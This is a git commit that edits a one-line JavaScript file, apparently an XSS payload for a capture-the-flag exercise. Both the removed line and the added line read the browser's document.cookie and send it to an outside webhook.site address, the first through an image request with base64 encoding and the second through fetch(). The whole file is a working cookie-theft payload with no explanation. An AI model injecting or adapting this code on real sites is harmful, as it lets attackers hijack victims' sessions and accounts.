b22c73a6cf90c83fd814ef528092ad9d4c72cf6c
Hujing91 <86124626+Hujing91@users.noreply.github.com>
2024-06-16 17:27:13 +0200

    Update 0xdf.js

--- 0xdf.js
+++ 0xdf.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/f68e057b-6f8f-41de-b54e-65c4df4291b4?data='+btoa(document.cookie);
+fetch('https://webhook.site/f68e057b-6f8f-41de-b54e-65c4df4291b4?cookie='+ document.cookie);
